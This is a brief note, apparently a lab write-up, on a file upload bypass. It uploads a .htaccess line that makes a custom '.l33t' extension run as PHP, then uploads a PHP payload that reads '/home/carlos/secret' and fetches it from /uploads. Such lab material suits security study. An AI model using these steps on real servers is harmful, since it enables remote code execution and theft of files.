If directory just returns file content, try to upload `.htaccess`
```htaccess
AddType application/x-httpd-php .l33t
```
then upload
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
then access your file `/uploads/exploit.l33t`

